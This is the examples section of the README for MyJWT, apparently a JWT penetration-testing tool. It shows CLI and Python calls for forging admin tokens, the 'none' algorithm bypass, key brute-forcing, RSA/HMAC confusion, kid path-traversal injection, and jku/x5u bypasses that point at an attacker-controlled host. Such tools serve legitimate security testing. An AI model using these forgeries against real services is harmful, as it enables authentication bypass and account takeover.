# Examples
- [Modify Your jwt](#modify-your-jwt)
- [None Vulnerabilty Check](#none-vulnerability)
- [Sign Key](#sign-key)
- [Brute Force Signature](#brute-force)
- [RSA/HMAC Confusion](#rsahmac-confusion)
- [Kid Injection](#kid-injection)
- [Send your new Jwt to url](#send-your-new-jwt-to-url)
- [Jku Vulnerability](#jku-vulnerability)
- [X5u Vulnerability](#x5u-vulnerability)
## Modify your Jwt
### CLI
```
myjwt YOUR_JWT --add-payload "username=admin" --add-header "refresh=false"
```
### Code
```
from myjwt.modify_jwt import add_header, change_payload
from myjwt.utils import jwt_to_json, SIGNATURE, encode_jwt

jwt_json = jwt_to_json(jwt)
jwt_json = add_header(jwt_json, {"kid": "001"})
jwt_json = change_payload(jwt_json, {"username": "admin"})
jwt = encode_jwt(jwt_json) + "." + jwt_json[SIGNATURE]
```
Full example here: [01-modify-jwt](https://github.com/mBouamama/MyJWT/blob/master/examples/01-modify-jwt/modify-jwt.py)
## None Vulnerability
### CLI
```
myjwt YOUR_JWT --none-vulnerability
```
### CODE
```
from myjwt.utils import jwt_to_json, SIGNATURE, encode_jwt
from myjwt.vulnerabilities import none_vulnerability
jwt_json = jwt_to_json(jwt)
jwt = none_vulnerability(encode_jwt(jwt_json) + "." + jwt_json[SIGNATURE])
```
Full example here: [02-none-vulnerability](https://github.com/mBouamama/MyJWT/blob/master/examples/02-none-vulnerability/none-vulnerability.py)
## Sign Key
### CLI
```
myjwt YOUR_JWT --sign YOUR_KEY
```
### CODE
```
from myjwt.modify_jwt import signature
from myjwt.utils import jwt_to_json
key = "test"
jwt = signature(jwt_to_json(jwt), key)
```
Full example here: [03-sign-key](https://github.com/mBouamama/MyJWT/blob/master/examples/03-sign-key/sign-key.py)
## Brute Force
### CLI
```
myjwt YOUR_JWT --bruteforce PATH
```
### CODE
```
from myjwt.vulnerabilities import bruteforce_wordlist
wordlist = "../../wordlist/common_pass.txt"
key = bruteforce_wordlist(jwt, wordlist)
```
Full example here: [04-brute-force](https://github.com/mBouamama/MyJWT/blob/master/examples/04-brute-force/brute-force.py)
## Crack
### CLI
```
myjwt YOUR_JWT --crack REGEX
```
## RSA/HMAC Confusion
### CLI
```
myjwt YOUR_JWT --hmac FILE
```
### CODE
```
from myjwt.vulnerabilities import confusion_rsa_hmac
file = "public.pem"
jwt = confusion_rsa_hmac(jwt, file)
```
Full example here: [05-rsa-hmac-confusion](https://github.com/mBouamama/MyJWT/blob/master/examples/05-rsa-hmac-confusion/rsa-hmac-confusion.py)
## Kid Injection
### CLI
```
myjwt YOUR_JWT --kid INJECTION
```
### Code
```
from myjwt.modify_jwt import signature
from myjwt.utils import jwt_to_json
from myjwt.vulnerabilities import inject_sql_kid

injection = "../../../../../../dev/null"
sign = ""
jwt = inject_sql_kid(jwt, injection)
jwt = signature(jwt_to_json(jwt), sign)
```
Full example here: [06-kid-injection](https://github.com/mBouamama/MyJWT/blob/master/examples/06-kid-injection/kid-injection.py)

## Send your new Jwt to url

### CLI
```
myjwt YOUR_JWT -u YOUR_URL -c "jwt=MY_JWT" --non-vulnerability --add-payload "username=admin"
```

## Jku Vulnerability
### CLI
```
myjwt YOUR_JWT --jku YOUR_URL
```
### Code
```
from myjwt.vulnerabilities import jku_vulnerability
new_jwt = jku_vulnerability(jwt=jwt, url="MYPUBLIC_IP")
print(jwt)
```
Full example here: [07-jku-bypass](https://github.com/mBouamama/MyJWT/blob/master/examples/07-jku-bypass/jku-bypass.py)
## X5U Vulnerability
### CLI
```
myjwt YOUR_JWT --x5u YOUR_URL
```
### Code
```
from myjwt.vulnerabilities import x5u_vulnerability
newJwt = x5u_vulnerability(jwt=jwt, url="MYPUBLIC_IP")
print(jwt)
```
Full example here: [08-x5u-bypass](https://github.com/mBouamama/MyJWT/blob/master/examples/08-x5u-bypass/x5u-bypass.py)
